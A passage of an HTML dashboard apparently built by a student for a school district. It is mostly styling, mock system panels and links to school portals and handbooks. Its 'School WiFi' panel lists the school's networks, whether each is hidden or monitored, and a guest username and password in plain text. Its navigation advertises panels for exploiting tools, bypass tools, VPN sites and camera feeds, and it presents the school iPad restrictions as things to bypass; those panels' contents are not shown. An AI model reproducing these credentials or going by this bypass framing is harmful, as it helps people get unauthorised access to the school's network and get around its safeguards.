    /* Reminder System Panel */
    .reminder-input-group label {
        display: block;
        margin-bottom: 8px;
        font-weight: bold;
    }
    .reminder-input-group input, .reminder-input-group textarea {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        background: rgba(255,255,255,0.05);
        border: 1px solid rgba(255,145,77,0.3);
        border-radius: 6px;
        color: #f0f0f0;
        font-size: 0.95em;
    }
    body.dashboard-body.light-theme .reminder-input-group input,
    body.dashboard-body.light-theme .reminder-input-group textarea {
        background: rgba(255,255,255,0.2);
        border-color: rgba(180,110,60,0.2);
        color: #333;
    }
    .reminder-input-group textarea {
        min-height: 80px;
        resize: vertical;
    }
    .reminder-list {
        margin-top: 20px;
        background: #3a3a3a;
        padding: 15px;
        border-radius: 8px;
        max-height: 250px;
        overflow-y: auto;
    }
    body.dashboard-body.light-theme .reminder-list {
        background: #f5f5f5;
        border: 1px solid #eee;
    }
    .reminder-item {
        background: #4a4a4a;
        padding: 12px 15px;
        margin-bottom: 8px;
        border-radius: 6px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        transition: all 0.3s ease;
    }
    body.dashboard-body.light-theme .reminder-item {
        background: #eeeeee;
    }
    .reminder-item:hover {
        background: #555555;
        transform: translateX(5px);
    }
    body.dashboard-body.light-theme .reminder-item:hover {
        background: #dddddd;
        transform: translateX(5px);
    }
    .reminder-item .details {
        flex-grow: 1;
        margin-right: 15px;
    }
    .reminder-item .details strong {
        color: #ffbf80;
        display: block;
        margin-bottom: 5px;
    }
    body.dashboard-body.light-theme .reminder-item .details strong {
        color: #994d00;
    }
    .reminder-item .delete-btn {
        background: none;
        border: none;
        color: #f44336;
        cursor: pointer;
        font-size: 1.3em;
        transition: color 0.3s ease;
    }
    .reminder-item .delete-btn:hover {
        color: #d32f2f;
    }

    /* System Logs Panel */
    .log-viewer {
        background: #1f1f1f;
        padding: 20px;
        border-radius: 8px;
        max-height: 350px;
        overflow-y: auto;
        font-family: 'Roboto Mono', monospace;
        font-size: 12px;
        border: 1px dashed #ff914d;
    }
    body.dashboard-body.light-theme .log-viewer {
        background: #f0f0f0;
        border: 1px dashed #b36b3b;
    }
    .log-viewer .log-entry {
        padding: 6px 10px;
        margin-bottom: 5px;
        border-radius: 4px;
        opacity: 0.9;
        transition: opacity 0.5s ease;
    }
    .log-viewer .log-entry:hover {
        opacity: 1;
    }
    .log-entry.info { color: #4CAF50; border-left: 3px solid #4CAF50;} /* Green */
    .log-entry.warn { color: #ff9800; border-left: 3px solid #ff9800;} /* Orange */
    .log-entry.error { color: #f44336; border-left: 3px solid #f44336;} /* Red */
    .log-entry.debug { color: #607D8B; border-left: 3px solid #607D8B;} /* Blue Grey */
    body.dashboard-body.light-theme .log-entry.info { color: #388E3C; border-left-color: #388E3C;}
    body.dashboard-body.light-theme .log-entry.warn { color: #F57C00; border-left-color: #F57C00;}
    body.dashboard-body.light-theme .log-entry.error { color: #D32F2F; border-left-color: #D32F2F;}
    body.dashboard-body.light-theme .log-entry.debug { color: #78909C; border-left-color: #78909C;}

    /* User Management Panel */
    .user-management-container {
        display: flex;
        flex-direction: column;
        gap: 15px;
    }
    .user-table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
        font-size: 13px;
    }
    .user-table th, .user-table td {
        padding: 12px 15px;
        text-align: left;
        border-bottom: 1px solid #4a4a4a;
    }
    body.dashboard-body.light-theme .user-table th,
    body.dashboard-body.light-theme .user-table td {
        border-bottom: 1px solid #eee;
    }
    .user-table th {
        background-color: #4a4a4a;
        color: #ffbf80;
        font-weight: 700;
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
    }
    body.dashboard-body.light-theme .user-table th {
        background-color: #f5f5f5;
        color: #994d00;
    }
    .user-table tbody tr {
      transition: background-color 0.3s ease;
    }
    .user-table tbody tr:hover {
      background-color: #404040;
    }
    body.dashboard-body.light-theme .user-table tbody tr:hover {
      background-color: #eeeeee;
    }
    .user-actions button {
      background: none;
      border: none;
      color: #4CAF50; /* Green for edit */
      cursor: pointer;
      font-size: 1.1em;
      margin-right: 5px;
      transition: color 0.3s ease;
    }
    .user-actions button:hover {
      color: #45a049;
    }
    .user-actions button.delete {
      color: #f44336; /* Red for delete */
    }
    .user-actions button.delete:hover {
      color: #d32f2f;
    }
    .add-user-form {
        background: #3a3a3a;
        padding: 20px;
        border-radius: 10px;
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 15px;
    }
    body.dashboard-body.light-theme .add-user-form {
        background: #f5f5f5;
        border: 1px solid #eee;
    }
    .add-user-form input {
        padding: 10px;
        background: rgba(255,255,255,0.05);
        border: 1px solid rgba(255,145,77,0.3);
        border-radius: 6px;
        color: #f0f0f0;
        font-size: 0.95em;
    }
    body.dashboard-body.light-theme .add-user-form input {
        background: rgba(255,255,255,0.2);
        border-color: rgba(180,110,60,0.2);
        color: #333;
    }
    .add-user-form button { /* Add user button */
        grid-column: 1 / -1; /* Span all columns */
        background-color: #4CAF50;
        color: white;
        padding: 12px;
        border-radius: 8px;
        border: none;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
    }
    .add-user-form button:hover {
        background-color: #45a049;
        transform: translateY(-2px);
    }
    body.dashboard-body.light-theme .add-user-form button {
        background-color: #b36b3b;
    }
    body.dashboard-body.light-theme .add-user-form button:hover {
        background-color: #994d00;
    }

    /* Advanced Settings Panel */
    .settings-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 25px;
      margin-top: 20px;
    }
    .setting-item {
      background: #3a3a3a;
      padding: 20px;
      border-radius: 10px;
      border-left: 5px solid #ff914d;
      transition: all 0.3s ease;
    }
    .setting-item:hover {
        transform: translateY(-5px);
        box-shadow: 0 8px 15px rgba(0,0,0,0.4);
    }
    body.dashboard-body.light-theme .setting-item {
      background: #f5f5f5;
      border-left: 5px solid #b36b3b;
    }
    body.dashboard-body.light-theme .setting-item:hover {
      box-shadow: 0 8px 15px rgba(255, 145, 77, 0.1);
    }
    .setting-item h3 {
      font-size: 1.1em;
      margin-bottom: 15px;
      color: #ffbf80;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    body.dashboard-body.light-theme .setting-item h3 {
      color: #994d00;
    }
    .setting-item label {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 15px;
      font-size: 1em;
      cursor: pointer;
    }
    .setting-item input[type="checkbox"] {
      transform: scale(1.3); /* Larger checkboxes */
      cursor: pointer;
    }
    .setting-item input[type="range"] {
      width: 100%;
      cursor: pointer;
    }
    .setting-item input[type="number"] {
      width: 60px;
      padding: 5px;
      text-align: center;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,145,77,0.3);
      border-radius: 4px;
      color: #f0f0f0;
    }
    body.dashboard-body.light-theme .setting-item input[type="number"] {
      background: rgba(255,255,255,0.2);
      border-color: rgba(180,110,60,0.2);
      color: #333;
    }

    /* Network Utilities Panel */
    .net-util-container {
        display: flex;
        flex-direction: column;
        gap: 15px;
    }
    .net-util-section {
        background: #3a3a3a;
        padding: 20px;
        border-radius: 10px;
        border-left: 5px solid #ff914d;
        transition: all 0.3s ease;
    }
    .net-util-section:hover {
        transform: translateY(-5px);
        box-shadow: 0 8px 15px rgba(0,0,0,0.4);
    }
    body.dashboard-body.light-theme .net-util-section {
        background: #f5f5f5;
        border-left: 5px solid #b36b3b;
    }
    body.dashboard-body.light-theme .net-util-section:hover {
        box-shadow: 0 8px 15px rgba(255, 145, 77, 0.1);
    }
    .net-util-section h4 {
        font-size: 1.2em;
        margin-bottom: 15px;
        color: #ffbf80;
        display: flex;
        align-items: center;
        gap: 10px;
    }
    body.dashboard-body.light-theme .net-util-section h4 {
        color: #994d00;
    }
    .net-util-section input[type="text"], .net-util-section input[type="number"] {
        padding: 10px;
        margin-right: 10px;
        background: rgba(255,255,255,0.05);
        border: 1px solid rgba(255,145,77,0.3);
        border-radius: 6px;
        color: #f0f0f0;
        font-size: 0.95em;
    }
    body.dashboard-body.light-theme .net-util-section input[type="text"],
    body.dashboard-body.light-theme .net-util-section input[type="number"] {
        background: rgba(255,255,255,0.2);
        border-color: rgba(180,110,60,0.2);
        color: #333;
    }
    .net-util-section button { /* Ping, Trace buttons */
        background-color: #4CAF50;
        color: white;
        padding: 10px 15px;
        border-radius: 8px;
        border: none;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
    }
    .net-util-section button:hover {
        background-color: #45a049;
        transform: translateY(-2px);
    }
    body.dashboard-body.light-theme .net-util-section button {
        background-color: #b36b3b;
    }
    body.dashboard-body.light-theme .net-util-section button:hover {
        background-color: #994d00;
    }
    .net-output {
        margin-top: 15px;
        background: #3a3a3a;
        padding: 15px;
        border-radius: 8px;
        max-height: 200px;
        overflow-y: auto;
        font-size: 13px;
        white-space: pre-wrap; /* Preserve formatting */
        word-wrap: break-word;
        border: 1px dashed #ff914d;
    }
    body.dashboard-body.light-theme .net-output {
        background: #f5f5f5;
        border: 1px dashed #b36b3b;
    }
    .ping-result, .trace-result { color: #ffd966; }
    .ping-error, .trace-error { color: #f44336; }
    body.dashboard-body.light-theme .ping-result, .trace-result { color: #994d00; }
    body.dashboard-body.light-theme .ping-error, .trace-error { color: #d32f2f; }

    /* Modal/Dialog Styling (for New Task, Add User, etc.) */
    .modal {
        display: none; /* Hidden by default */
        position: fixed; /* Stay in place */
        z-index: 1000; /* Sit on top */
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto; /* Enable scroll if needed */
        background-color: rgba(0,0,0,0.6); /* Dimmed background */
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        justify-content: center;
        align-items: center;
    }

    .modal-content {
        background: rgba(0, 0, 0, 0.85);
        margin: auto;
        padding: 30px;
        border: 3px solid #4CAF50;
        border-radius: 15px;
        width: 50%; /* Adjust as needed */
        max-width: 600px;
        box-shadow: 0 0 25px rgba(76, 175, 80, 0.6);
        animation: zoomIn 0.4s ease-out;
        display: flex;
        flex-direction: column;
    }
    body.dashboard-body.light-theme .modal-content {
        background: rgba(255, 255, 255, 0.9);
        border-color: #b36b3b;
        box-shadow: 0 0 25px rgba(179, 107, 59, 0.4);
    }

    @keyframes zoomIn {
        from {transform: scale(0.9); opacity: 0;}
        to {transform: scale(1); opacity: 1;}
    }

    .modal-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
        border-bottom: 1px solid #4a4a4a;
        padding-bottom: 15px;
    }
    body.dashboard-body.light-theme .modal-header {
        border-bottom-color: #eee;
    }
    .modal-header h2 {
        font-size: 1.8em;
        color: #ffbf80;
        font-weight: 700;
    }
    body.dashboard-body.light-theme .modal-header h2 {
        color: #994d00;
    }

    .modal-header .close-btn {
        background: none;
        border: none;
        font-size: 2.5em;
        color: #f44336;
        cursor: pointer;
        transition: color 0.3s ease;
    }
    .modal-header .close-btn:hover {
        color: #d32f2f;
    }

    .modal-body form {
        display: flex;
        flex-direction: column;
        gap: 15px;
    }
    .modal-body label {
        font-weight: bold;
        display: block;
        margin-bottom: 8px;
        color: #ffbf80;
    }
    body.dashboard-body.light-theme .modal-body label {
        color: #994d00;
    }
    .modal-body input, .modal-body textarea {
        padding: 12px;
        background: rgba(255,255,255,0.05);
        border: 1px solid rgba(255,145,77,0.3);
        border-radius: 6px;
        color: #f0f0f0;
        font-size: 1em;
    }
    body.dashboard-body.light-theme .modal-body input,
    body.dashboard-body.light-theme .modal-body textarea {
        background: rgba(255,255,255,0.2);
        border-color: rgba(180,110,60,0.2);
        color: #333;
    }
    .modal-body button[type="submit"] {
        background-color: #4CAF50;
        color: white;
        padding: 12px 20px;
        border: none;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
        transition: all 0.3s ease;
        margin-top: 10px;
    }
    .modal-body button[type="submit"]:hover {
        background-color: #45a049;
        transform: translateY(-2px);
    }
    body.dashboard-body.light-theme .modal-body button[type="submit"] {
        background-color: #b36b3b;
    }
    body.dashboard-body.light-theme .modal-body button[type="submit"]:hover {
        background-color: #994d00;
    }
  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>ùôãùôßùôûùô´ùôñùô©ùôö ùôéùôÆùô®ùô©ùôöùô¢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <input type="checkbox" id="showPassword" />
      <span>Show Password</span>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 5</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="ENTER RESET CODE" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.6.0</div>
    </div>

    <!-- Quick Bar - Moved some new items here -->
    <div class="quick-bar">
      <button id="sessionTime">‚è≥ Session Time: 00:00:00</button>
      <button id="realTimeClock">üïí --:--:--</button>
      <button id="realDate">üìÖ --</button>
      <button id="notesBtn">üìí Notes Canvas</button>
      <button id="exportNotesBtn">üíæ Export Canvas</button>
      <button id="screenshotBtn">üì∏ Screenshot Page</button>
      <button id="toggleSectionsBtn">‚¨ÜÔ∏è Toggle Main Sections</button>
      <button id="fixIssuesBtn">üõ†Ô∏è Run Diagnostics</button>
      <button id="fullScreenBtn">üñ•Ô∏è Full Screen</button>
      <button id="zoomInBtn">‚ûï Zoom In</button>
      <button id="zoomOutBtn">‚ûñ Zoom Out</button>
      <button id="restartBtn">üîÑ Restart Page</button>
      <button id="panicBtn">üö® P.A.N.I.C.</button>
      <button id="themeToggle">üåô Dark Mode</button>
      <button id="logoutBtn">üîì Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>üöÄ Welcome to the enhanced Private Dashboard! Explore new features, monitor system status, and manage tasks.</span>
    </div>
    
    <!-- Main Dashboard Sections -->
    <div class="main-row" id="mainGrid">
      
      <!-- Calendar Section -->
      <div class="calendar-container" id="calendarBox">
        <h2>üìÖ Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <!-- Motivation Box -->
      <div class="box motivation-box" id="motivationBox">
        "The future belongs to those who believe in the beauty of their dreams." ‚Äì Eleanor Roosevelt
      </div>
    </div>

    <!-- Updates & Notifications -->
    <div id="updatesNotifications">
      <div class="box">
        <h2>üîÑ System Updates</h2>
        <div class="box-content">
          <div class="update-entry">Dashboard UI Overhaul - Version 1.6.0</div>
          <div class="update-entry">New Monitoring Tools Added</div>
          <div class="update-entry">Reminder System Implemented</div>
          <div class="update-entry">Performance Enhancements Deployed</div>
          <div class="update-entry">Security Patches Applied (Simulated)</div>
        </div>
      </div>

      <div class="box">
        <h2>üîî Notifications & Alerts</h2>
        <div class="box-content">
          <p>System health is nominal.</p>
          <p>User activity logs are being processed.</p>
          <p>Incoming alert: High CPU usage detected on subsystem 3.</p>
          <p>Reminder: Weekly system check due.</p>
          <p>New user profile 'Admin.Sys' created.</p>
        </div>
      </div>
    </div>

    <!-- Section Navigation Buttons -->
    <div class="quick-bar" style="flex-wrap: wrap; margin-top: 30px; background: rgba(30, 30, 30, 0.3);">
      <button onclick="dashboard.togglePanel('systemMonitorPanel')">üìä System Monitoring</button>
      <button onclick="dashboard.togglePanel('taskManagerPanel')">‚öôÔ∏è Task Manager</button>
      <button onclick="dashboard.togglePanel('fileManagerPanel')">üìÅ File Manager</button>
      <button onclick="dashboard.togglePanel('reminderPanel')">üîî Reminder System</button>
      <button onclick="dashboard.togglePanel('systemLogsPanel')">üìú System Logs</button>
      <button onclick="dashboard.togglePanel('userManagementPanel')">üë§ User Management</button>
      <button onclick="dashboard.togglePanel('advancedSettingsPanel')">üîß Advanced Settings</button>
      <button onclick="dashboard.togglePanel('networkUtilitiesPanel')">üåê Network Utilities</button>
      <button onclick="dashboard.togglePanel('wifiPanel')">üì° School WiFi</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">üì± School iPad</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">üìò Student Handbooks</button>
      <button onclick="dashboard.togglePanel('mapPanel')">üè´ School Map</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">üåê Student Websites</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">üë©‚Äçüè´ Teacher Websites</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">üìû Phone Directory</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">üì∑ Camera Feeds</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">üè´ School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">üß® Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">üö™ Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">üîê VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">üéÆ Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">üéµ Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">üéπ Keyboard Shortcuts</button>
    </div>

    <!-- Information Panels -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      
      <!-- System Monitoring Panel -->
      <div id="systemMonitorPanel" class="info-panel">
        <h2>üìä System Monitoring</h2>
        <div class="sys-monitor-grid">
          <div class="monitor-item">
            <h3><span class="icon">üíª</span> CPU Usage</h3>
            <div class="progress-bar-container">
              <div id="cpuUsageBar" class="progress-bar" style="width: 65%;">65%</div>
            </div>
          </div>
          <div class="monitor-item">
            <h3><span class="icon">üíΩ</span> RAM Usage</h3>
            <div class="progress-bar-container">
              <div id="ramUsageBar" class="progress-bar high" style="width: 78%;">78%</div>
            </div>
          </div>
          <div class="monitor-item">
            <h3><span class="icon">üíæ</span> Disk Usage (C:)</h3>
            <div class="progress-bar-container">
              <div id="diskUsageBar" class="progress-bar critical" style="width: 92%;">92%</div>
            </div>
          </div>
          <div class="monitor-item">
            <h3><span class="icon">üì°</span> Network Speed</h3>
            <div class="progress-bar-container">
              <div id="netSpeedBar" class="progress-bar" style="width: 45%;">45%</div>
            </div>
          </div>
        </div>
      </div>

      <!-- Task Manager Panel -->
      <div id="taskManagerPanel" class="info-panel">
        <h2>‚öôÔ∏è Task Manager</h2>
        <div class="file-manager-container"> <!-- Re-using container for layout -->
          <div class="fm-header">
            <button id="newTaskBtn">‚ûï New Task</button>
          </div>
          <div class="task-manager-table">
            <thead>
              <tr>
                <th>Process Name</th>
                <th>PID</th>
                <th>CPU %</th>
                <th>Memory</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody id="taskTableBody">
              <!-- Tasks will be loaded here by JS -->
            </tbody>
          </table>
        </div>
      </div>

      <!-- File Manager Panel -->
      <div id="fileManagerPanel" class="info-panel">
        <h2>üìÅ File Manager</h2>
        <div class="file-manager-container">
          <div class="fm-header">
            <div id="currentPath">Path: /</div>
            <button id="fmNewFolderBtn">‚ûï New Folder</button>
            <button id="fmUploadBtn">‚¨ÜÔ∏è Upload File</button>
          </div>
          <div class="file-list">
            <ul id="fileListRoot">
              <!-- Files and folders will be loaded here -->
            </ul>
          </div>
        </div>
      </div>

      <!-- Reminder System Panel -->
      <div id="reminderPanel" class="info-panel">
        <h2>üîî Reminder System</h2>
        <div class="reminder-input-group">
          <label for="reminderMessage">Message:</label>
          <textarea id="reminderMessage" placeholder="Enter reminder message..." required></textarea>
          <label for="reminderDateTime">Date & Time:</label>
          <input type="datetime-local" id="reminderDateTime" required>
          <button id="addReminderBtn" style="background-color: #4CAF50; color: white; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; transition: all 0.3s ease;">Add Reminder</button>
        </div>
        <div class="reminder-list">
          <h3 style="color: #ffbf80; margin-bottom: 10px;">Upcoming Reminders:</h3>
          <ul id="reminderList">
            <!-- Reminders will be listed here -->
          </ul>
        </div>
      </div>

      <!-- System Logs Panel -->
      <div id="systemLogsPanel" class="info-panel">
        <h2>üìú System Logs</h2>
        <div class="log-viewer" id="logViewer">
          <!-- Logs will appear here -->
        </div>
      </div>

      <!-- User Management Panel -->
      <div id="userManagementPanel" class="info-panel">
        <h2>üë§ User Management</h2>
        <div class="user-management-container">
          <div class="add-user-section">
            <h3>Add New User</h3>
            <div class="add-user-form">
              <input type="text" id="newUserUsername" placeholder="Username" />
              <input type="password" id="newUserPassword" placeholder="Password" />
              <input type="text" id="newUserID" placeholder="User ID" />
              <select id="newUserRole">
                <option value="User">User</option>
                <option value="Admin">Admin</option>
                <option value="Guest">Guest</option>
              </select>
              <input type="text" id="newUserRank" placeholder="Rank" />
              <button id="addUserBtn">Add User</button>
            </div>
          </div>
          <h3>Existing Users</h3>
          <table class="user-table">
            <thead>
              <tr>
                <th>Username</th>
                <th>User ID</th>
                <th>Role</th>
                <th>Rank</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody id="userTableBody">
              <!-- User data will be loaded here -->
            </tbody>
          </table>
        </div>
      </div>

      <!-- Advanced Settings Panel -->
      <div id="advancedSettingsPanel" class="info-panel">
        <h2>üîß Advanced Settings</h2>
        <div class="settings-grid">
          <div class="setting-item">
            <h3><span class="icon">‚ú®</span> Visuals</h3>
            <label>
              <span>Enable Animations</span>
              <input type="checkbox" id="settingAnimations" checked />
            </label>
            <label>
              <span>Animation Speed (ms)</span>
              <input type="number" id="settingAnimationSpeed" value="500" min="100" max="2000" />
            </label>
            <label>
              <span>Interface Glow Intensity</span>
              <input type="range" id="settingGlowIntensity" min="0" max="1" step="0.1" value="0.7" />
            </label>
          </div>
          <div class="setting-item">
            <h3><span class="icon">‚öôÔ∏è</span> Performance</h3>
            <label>
              <span>Auto-Refresh Rate (s)</span>
              <input type="number" id="settingAutoRefresh" value="15" min="5" max="60" />
            </label>
            <label>
              <span>Task Manager Update Interval (ms)</span>
              <input type="number" id="settingTaskUpdate" value="2000" min="500" max="5000" />
            </label>
            <label>
              <span>System Monitor Update (ms)</span>
              <input type="number" id="settingMonitorUpdate" value="3000" min="1000" max="10000" />
            </label>
          </div>
          <div class="setting-item">
            <h3><span class="icon">üîí</span> Security (Simulated)</h3>
            <label>
              <span>Enable Auto-Lockout</span>
              <input type="checkbox" id="settingAutoLockout" />
            </label>
            <label>
              <span>Lockout Timeout (min)</span>
              <input type="number" id="settingLockoutTimeout" value="5" min="1" max="30" disabled />
            </label>
            <label>
              <span>Alert on Suspicious Activity</span>
              <input type="checkbox" id="settingSuspiciousAlert" checked />
            </label>
          </div>
        </div>
      </div>

      <!-- Network Utilities Panel -->
      <div id="networkUtilitiesPanel" class="info-panel">
        <h2>üåê Network Utilities</h2>
        <div class="net-util-container">
          <div class="net-util-section">
            <h4><span class="icon">üöÄ</span> Ping Utility</h4>
            <input type="text" id="pingTarget" placeholder="Enter Hostname or IP" />
            <button id="pingBtn">Ping</button>
            <div class="net-output" id="pingOutput">
              <p class="log-entry debug">Ping utility ready. Enter a hostname or IP address above.</p>
            </div>
          </div>
          <div class="net-util-section">
            <h4><span class="icon">üó∫Ô∏è</span> Traceroute Utility</h4>
            <input type="text" id="traceTarget" placeholder="Enter Hostname or IP" />
            <button id="traceBtn">Trace</button>
            <div class="net-output" id="traceOutput">
              <p class="log-entry debug">Traceroute utility ready. Enter a hostname or IP address above.</p>
            </div>
          </div>
        </div>
      </div>

      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>üì° School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div>High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div>Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div>Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>üì± School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <h3>General Restrictions</h3>
          <p>App Store: Disabled</p>
          <p>In-App Purchases: Disabled</p>
          <p>Web Content Filtering: Enabled</p>
          <p>Camera: Restricted</p>
          <p>Siri: Restricted</p>
          <h3>Managed Apps</h3>
          <p>Only approved applications are allowed.</p>
          <p>Managed apps include: Canvas, Clever, Google Suite, Office 365.</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Bypass methods are continuously updated and may vary.</p>
          <p>Check the 'Bypassing Tools' section for known methods.</p>
          <p><b>Disclaimer:</b> Unauthorized bypassing may violate school policy.</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>üìò Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Discipline%20Matrix%202024-2025%20.pdf" target="_blank">Discipline Matrix (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>üè´ School Building Map Information</h2>
        <div class="coming-soon">
          School Map coming soon. Currently under development.
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>üåê Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb Portal</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Learning</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Access</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram Portal</a>
          <a href="https://id.naviance.com" target="_blank">Naviance for College</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library Catalog</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool Student Portal</a>
          <a href="https://safe2saypa.org" target="_blank">Safe2Say Reporting</a>
          <a href="https://mail.google.com/mail/" target="_blank">Student Gmail</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! Learning Analytics</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>üë©‚Äçüè´ Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning Login</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq Platform</a>
